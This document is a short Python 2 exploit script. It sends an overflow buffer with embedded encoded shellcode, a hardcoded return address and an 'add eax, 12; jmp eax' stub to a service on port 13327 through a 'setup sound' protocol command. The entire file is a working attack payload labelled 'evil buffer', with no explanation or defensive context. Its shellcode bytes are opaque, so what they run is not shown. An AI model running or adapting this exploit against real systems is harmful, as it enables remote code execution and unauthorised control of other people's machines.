#!/usr/bin/python

import socket



shellcode = ("\xbd\x5d\xbd\xc3\x66\xda\xdf\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x14\x31\x6a\x14\x03\x6a\x14\x83\xc2\x04\xbf\x48\xf2\xbd\xc8"
"\x50\xa6\x02\x65\xfd\x4b\x0c\x68\xb1\x2a\xc3\xea\xe9\xec\x89"
"\x82\x0f\x11\x3f\x0e\x7a\x01\x6e\xfe\xf3\xc0\xfa\x98\x5b\xce"
"\x7b\xed\x1d\xd4\xc8\xe9\x2d\xb2\xe3\x71\x0e\x8b\x9a\xbc\x11"
"\x78\x3b\x54\x2d\x27\x71\x28\x18\xae\x71\x40\xb4\x7f\xf1\xf8"
"\xa2\x50\x97\x91\x5c\x26\xb4\x31\xf2\xb1\xda\x01\xff\x0c\x9c")

#C = add eax, 12 83C00C, jmpeax FFE0
crash = shellcode + "A" * (4368-len(shellcode)) + "\x96\x45\x13\x08" + "\x83\xC0\x0C\xFF\xE0" + "\x90" * 2

host = "127.0.0.1"


buffer = "\x11(setup sound " + crash + "\x90\x00"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."
s.connect((host, 13327))
data=s.recv(1024)
print data
s.send(buffer)
s.close()
print "[*]Payload Sent!"

